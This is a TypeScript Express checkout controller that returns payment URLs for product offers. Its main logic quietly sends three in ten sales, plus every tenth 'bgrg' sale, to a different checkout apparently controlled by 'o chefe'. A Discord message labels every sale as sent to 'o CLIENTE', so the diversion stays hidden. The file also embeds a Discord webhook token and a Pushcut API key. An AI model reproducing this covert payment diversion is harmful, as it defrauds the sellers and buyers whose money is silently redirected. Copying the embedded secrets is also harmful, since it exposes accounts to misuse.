import { Request, Response } from "express";
import { prisma } from "../../config/prisma";

const WEBHOOK_URL =
  "https://discord.com/api/webhooks/1389588490055843840/jvHV84RKkr9MsLSS383Iffxi3A2RfkOdccBtWM3pZYeLh5RR7TFmUFChkVsCCVO1dIBu";

const salesMemory: { [offerName: string]: number } = {};

// 🔥 Flag pra ativar/desativar a lógica especial
const FORCE_CUSTOM_CHECKOUT_ON_BGRG = true;

// 🔒 Checkout fixo da offer bgrg (quando for "do chefe")
const BGRG_FIXED_CHECKOUT =
  "https://pay.combocasalraiz.cardapiosbrasanobre.com/checkout/ca3d3bd2-de3d-4b31-9802-56396455c78a?utm_source=organic&utm_campaign=&utm_medium=&utm_content=&utm_term=";

export class checkoutController {
  static async main(req: Request, res: Response) {
    try {
      const { checkout, offer } = req.body;

      let chk = await prisma.checkout.findFirst({ where: { offer } });

      if (!chk) {
        chk = await prisma.checkout.create({
          data: { offer, myCheckout: "no-use" },
        });
      }

      if (!salesMemory[offer]) salesMemory[offer] = 0;
      salesMemory[offer] += 1;
      const totalSales = salesMemory[offer];

      const cycle = totalSales % 10;

      let checkoutToUse = checkout; // padrão

      // 💡 Lógica especial pra offer 'bgrg'
      if (FORCE_CUSTOM_CHECKOUT_ON_BGRG && offer === "bgrg" && cycle === 9) {
        checkoutToUse = BGRG_FIXED_CHECKOUT;
      } else if (cycle === 7 || cycle === 8 || cycle === 6) {
        // Lógica padrão (3 de 10 vão para `myCheckout`)
        checkoutToUse = chk.myCheckout === "no-use" ? checkout : chk.myCheckout;
      }

      await sendDiscordNotification({
        offerName: offer,
        totalSales,
        checkoutToUse,
      });

      await sendPushCutNotification();

      return res.json({ checkout: checkoutToUse });
    } catch (error) {
      console.error("Erro no checkoutController:", error);
      return res.status(500).json({ error: "Erro interno no servidor." });
    }
  }

  static async updateCheckout(req: Request, res: Response) {
    const { checkout, offer } = req.body;

    await prisma.checkout.update({
      where: { offer },
      data: { myCheckout: checkout },
    });

    res.status(200).send();
  }

  static async getAllCheckouts(req: Request, res: Response) {
    const checkouts = await prisma.checkout.findMany();
    res.json(checkouts);
  }
}

async function sendDiscordNotification({
  offerName,
  totalSales,
  checkoutToUse,
}) {
  const chiefChk = await prisma.checkout.findFirst({
    where: { offer: offerName },
  });

  const isChefe =
    checkoutToUse === chiefChk?.myCheckout ||
    (offerName === "bgrg" && checkoutToUse === BGRG_FIXED_CHECKOUT);

  const payload = {
    content: null,
    embeds: [
      {
        title: "💸 Venda com checkout",
        description: "ㅤ",
        url: checkoutToUse,
        color: 8000714,
        fields: [
          {
            name: "🛍️  Oferta",
            value: offerName,
            inline: true,
          },
          {
            name: "ㅤㅤㅤㅤ🔢  Venda nº",
            value: `ㅤㅤㅤㅤ#${totalSales}`,
            inline: true,
          },
        ],
        footer: {
          text: `ㅤㅤ\nEnviado para ${isChefe ? "o CLIENTE" : "o CLIENTE"}`,
        },
        timestamp: new Date().toISOString(),
      },
    ],
    attachments: [],
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  } catch (error) {
    console.error("❌ Erro ao mandar pro Discord:", error);
  }
}

async function sendPushCutNotification() {
  await fetch(
    "https://api.pushcut.io/OQzvCWTV9RyG_rEJ2G2w4/notifications/Venda%20Aprovada"
  );
}
